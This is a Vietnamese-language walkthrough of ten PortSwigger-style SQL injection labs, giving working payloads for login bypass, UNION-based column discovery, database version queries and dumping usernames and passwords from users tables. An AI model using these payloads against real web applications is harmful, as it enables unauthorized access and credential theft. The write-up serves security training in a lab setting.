![image](https://github.com/itravnn/kcsc_train/assets/127108265/1bf09e34-9159-419f-8be0-833571e46b44)

# 1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Truy cập vào lab, giao diện như hình dưới

![image](https://github.com/itravnn/kcsc_train/assets/127108265/0e8b9513-e131-40e7-a3ba-755eacee049c)

Sau đó thử nhấp vào từng option thì để ý thấy trên thanh URL, giá trị sau tham số `category` thay đổi

![image](https://github.com/itravnn/kcsc_train/assets/127108265/8e490a00-1c0b-4c0b-8ecc-900fdeedb636)

![image](https://github.com/itravnn/kcsc_train/assets/127108265/91f4f6fa-b35c-4399-8fbe-227dbb697c27)

thêm dấu **`'`** vào sau thì thấy trang web trả về thông báo lỗi, so có thể thực hiện tấn công sql

![image](https://github.com/itravnn/kcsc_train/assets/127108265/ab6a9c3c-06b0-4727-9d42-0fcc60bea1dc)

thêm **`' or 1=1--`** vào sau tham số `category` thì câu truy vấn sql lúc này thành `SELECT * FROM products WHERE category = 'Accessories' or 1=1 --`, do 1=1 luôn đúng nên web trả về lúc này sẽ bao gồm tất cả sản phẩm kể cả sản phẩm bị ẩn

![image](https://github.com/itravnn/kcsc_train/assets/127108265/b28f0001-5997-4a40-a07e-374a073f00e2)

# 2. Lab: SQL injection vulnerability allowing login bypass

Truy cập vào lab, để ý thấy tên lab _lỗ hổng sqli cho phép vượt qua đăng nhập_ nên vào phần **my account** 

![image](https://github.com/itravnn/kcsc_train/assets/127108265/b8312a92-4e0a-4964-88d9-99c8574925b2)

tại phần login, đề chỉ cho username=administrator mà không biết passwd, để bypass thì ở phần nhập username ta nhập giá trị **`administrator' --`**, còn passwd thì tùy ý. do là sau dấu **`--`** mọi thứ đều bỏ qua nên câu truy vấn lúc này luôn đúng

![image](https://github.com/itravnn/kcsc_train/assets/127108265/9cb486a9-0ad3-4369-b649-e23468450d22)

Đăng nhập thành công, hoặc nếu không biết cả username thì có thể nhập **`' or 1=1--`**, cũng sẽ đăng nhập được vô

# 3. Lab: SQL injection UNION attack, determining the number of columns returned by the query

Lab này yêu cầu xác định số cột được truy vấn trả về bằng cách thực hiện tấn công UNION chèn SQL để trả về một hàng bổ sung chứa giá trị null.

![image](https://github.com/itravnn/kcsc_train/assets/127108265/bb7dbbdb-283d-487d-a7b4-cc33912e21ea)

tương tự ở lab1, ta sẽ sửa tham số `category`, ta thêm **`' union select null--`** tương ứng với số cột là 1, thông báo trả vể lỗi, vậy là số cột không phải 1. Tiếp tụ thử thì được số cột là 3 **`' union select null,null,null--`** 

![image](https://github.com/itravnn/kcsc_train/assets/127108265/5ac58f64-c0a9-40b7-9e9f-a541df5bcf96)

_We use `NULL` as the values returned from the injected SELECT query because the data types in each column must be compatible between the original and the injected queries. `NULL` is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct._

hoặc cũng có thể xác định số cột bằng cách dùng **order by**
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```
![image](https://github.com/itravnn/kcsc_train/assets/127108265/0fe14273-97d8-4dc4-b75a-9d3e163d6a2b)

# 4. Lab: SQL injection UNION attack, finding a column containing text

Để tìm được cột chứa văn bản, trước tiên ta cần tìm được số cột của truy vấn trả về. Như lab trước ta sẽ tìm được số cột là 3 

![image](https://github.com/itravnn/kcsc_train/assets/127108265/c2b48002-4727-4119-917c-73d9de88b6f1)

Sau đó dể xác định được cột chứa văn bản, ta sẽ thay thế từng NULL bằng 1 giá trị chuỗi bất kỳ. Nếu không có thông báo lỗi trả về tức là cột đó chứa dữ liệu, nếu có lỗi thì tiếp tục các cột tiếp

```
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

Sau khi áp vô bài thì ta tìm cột chứa dữ liệu là cột 2

![image](https://github.com/itravnn/kcsc_train/assets/127108265/c093e2df-e2a1-42be-8cb9-272ccc64b25c)

ở đây phần bài có cho biết là truy xuất dữ liệu với chuỗi `'mNlxus'` nên ta chỉ cần thay `'a' = 'mNlxus' ` là solved

# 5. Lab: SQL injection UNION attack, retrieving data from other tables

tương tự 2 lab trước, ta sẽ tìm được 2 cột trả về và cả 2 cột đều chứa data

theo bài thì 

>The database contains a different table called users, with columns called username and password

Sử dụng payload sau để truy xuất nội dung của bảng users:
```
' UNION SELECT username,password FROM users--
```
![image](https://github.com/itravnn/kcsc_train/assets/127108265/fc737b66-b69c-4fbd-b1b1-b59f3feb1698)

tìm được tên user và passwd, sau đó đăng nhập là xong!!

# 6. Lab: SQL injection UNION attack, retrieving multiple values in a single column

theo cách nối chuỗi như ni

![image](https://github.com/itravnn/kcsc_train/assets/127108265/f6fbb947-ac04-43ee-9fb2-3e06ab25e82f)

Xác định truy vấn trả về 2 cột và cột 2 chứa data, sau đó ta sẽ sử dụng payload sau để truy xuất được nhiều giá trị 

```
' union select null, username || '~' || password from users--
```

![image](https://github.com/itravnn/kcsc_train/assets/127108265/892d46a3-a141-4c6d-b04b-9abbbce9a050)

tìm được username và passwd sau đó login là done!!

# 7. Lab: SQL injection attack, querying the database type and version on Oracle

Đẩy lên để kiểm tra với burp suite

Như các lab trước, để thực hiện kiểm tra xem số cột thì ta có thể dùng payload sau 
```
'union+select+null,null--
```
 Nhưng ở lab ni nếu làm vậy thì web trả về thông báo lỗi

![image](https://github.com/itravnn/kcsc_train/assets/127108265/a34599a2-f79a-4499-ad35-4be9113b78bc)

Theo hint từ bài thì lab sử dụng CSDL Oracle nên sau mệnh đề SELECT cần chỉ rõ 1 bảng chọn từ FROM. Ở đây cho biết có 1 bảng tên dual nên ta sẽ thay đổi payload thành

```
'union+select+null,null+from+dual--
```

![image](https://github.com/itravnn/kcsc_train/assets/127108265/c031ffec-56bc-4a83-972f-85752849357c)

Không có lỗi trả về, truy vấn được thực hiện. Tiếp tục ta sẽ tìm được ở cột 2 sẽ chứa data.

Sau đó để truy xuất được version database ta dựa vào thông tin ni

![image](https://github.com/itravnn/kcsc_train/assets/127108265/8fbb75a7-d0fb-4f47-9325-5a1b744e3373)

do là kiểu CSDL Oracle, nên ta có payload sau
```
'union+select+null,banner+FROM+v$version--
```
Không có thông báo lỗi trả về và tìm được

![image](https://github.com/itravnn/kcsc_train/assets/127108265/ab8c4741-c06c-4c26-a6e2-3328e89175d3)

# 8. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

Đầu tiên xác định số cột trả về với payload
```
'+union+select+null,null--
```
![image](https://github.com/itravnn/kcsc_train/assets/127108265/e8a74f6d-45a7-41e0-920a-5f7074d7b94f)

Tuy nhiên thông báo trả về lỗi,  về cú pháp thấy không có gì sai, ta để ý phần dấu comment

![image](https://github.com/itravnn/kcsc_train/assets/127108265/9c14d0cf-1d24-4065-9022-0d430fcb6b7a)

thử thay **`--`** thành **`#`** thì không có lỗi

![image](https://github.com/itravnn/kcsc_train/assets/127108265/b4c1be52-d36f-4e67-9bcb-31d303887801)

Sau đó tiếp tục xác định được cả 2 cột đều chứa data, để truy xuất được version ta nhập như sau

![image](https://github.com/itravnn/kcsc_train/assets/127108265/5c064cd9-d4e1-4e07-a9aa-16e0d49835a6)

tìm được version

![image](https://github.com/itravnn/kcsc_train/assets/127108265/66ff8a83-7023-4edf-adae-4b3457b4e916)

# 9. Lab: SQL injection attack, listing the database contents on non-Oracle databases

kiểm tra xem truy vấn trả về bao nhiêu cột

![image](https://github.com/itravnn/kcsc_train/assets/127108265/5a71c027-7efc-4f35-a565-ab3fb55e2209)

như vậy số cột là 2 và tiếp tục tìm được cả 2 cột đều chứa data

để hiển thị tên các bảng, tham khảo

![image](https://github.com/itravnn/kcsc_train/assets/127108265/bd3d8bee-cb08-490f-99a5-5f170967b57d)

như vậy có payload như sau
```
'+union+select+table_name,null+from+information_schema.tables--
```

![image](https://github.com/itravnn/kcsc_train/assets/127108265/66e428de-be00-4172-be17-2703aea31bce)

tìm ra bảng xác thực

![image](https://github.com/itravnn/kcsc_train/assets/127108265/5c3f820d-6497-4d5f-a1fd-26e7a10894f7)

sau đó để tìm tên các cột có trong bảng **users_hkyden**, payload sau
```
'+union+select+column_name,null+from+information_schema.columns+where+table_name='users_hkyden'-- 
```
![image](https://github.com/itravnn/kcsc_train/assets/127108265/3f8bd006-8375-426f-8e44-3959771365a9)

truy vấn trả về 2 cột là **username_tkvdff** và **password_kiypez**

![image](https://github.com/itravnn/kcsc_train/assets/127108265/4acb39f6-1b18-4430-99d6-d0ee9705d920)

cuối cùng tìm data trong 2 cột đó

```
'+union+select+username_tkvdff,password_kiypez+from+users_hkyden--
```
kết quả trả về

![image](https://github.com/itravnn/kcsc_train/assets/127108265/65f023af-c638-4027-9a6e-1f66355a5032)

Login là xong!!

# 10. Lab: SQL injection attack, listing the database contents on Oracle

>There is a built-in table on Oracle called `dual` which you can use for this purpose

tìm số cột
![image](https://github.com/itravnn/kcsc_train/assets/127108265/e4e24108-c17a-43db-9e7f-1f40cc7bda24)

vậy là có 2 cột và tiếp tục truy vấn sẽ biết được cả 2 cột đều chứa data

các bước tiếp theo tương tự như lab trước

tìm tên các bảng

![image](https://github.com/itravnn/kcsc_train/assets/127108265/0c7e4daf-6094-46a8-9809-4289a7bcf621)

tìm được bảng chứa thông tin người dùng **USERS_YCNNZE**

tiếp tục tìm các name các cột

![image](https://github.com/itravnn/kcsc_train/assets/127108265/7b559d2b-78d4-4435-89e2-76542319834d)

tìm được cột ***PASSWORD_ZEJHMM** và **USERNAME_BDILYN**

cuối cùng là tìm data trong 2 cụt kia

```
'+union+select+USERNAME_BDILYN,PASSWORD_ZEJHMM+from+USERS_YCNNZE--
```

![image](https://github.com/itravnn/kcsc_train/assets/127108265/06b8c55d-a374-44d7-8843-52ab523974c3)

done!!!!!!!!!

https://www.youtube.com/watch?v=lSVBvPMXcWE








